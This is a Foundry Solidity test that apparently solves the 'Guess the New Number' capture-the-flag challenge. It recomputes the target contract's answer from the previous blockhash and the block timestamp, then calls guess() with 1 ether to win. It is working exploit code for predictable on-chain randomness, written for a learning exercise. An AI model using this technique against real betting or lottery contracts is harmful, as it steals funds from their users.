// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../src/IGuessTheNewNumberChallenge.sol";

contract GuessTheNewNumberChallengeTest is Test {
    address private constant TARGET_ADDRESS = 0x2B15A7419Abbd7dc512a8b75A40e26ea767Bf3A7;
    IGuessTheNewNumberChallenge private target;

    function setUp() public {
        target = IGuessTheNewNumberChallenge(TARGET_ADDRESS);
    }

    function testGuessTheNewNumberChallenge() public {
        uint8 answer = uint8(
            uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))
        );
        (bool success, ) = TARGET_ADDRESS.call{value: 1 ether}(
            abi.encodeWithSignature("guess(uint8)", answer)
        );
        console.log(TARGET_ADDRESS.balance);
        assertTrue(success);
        assertTrue(target.isComplete());
    }

    receive() external payable {}
}
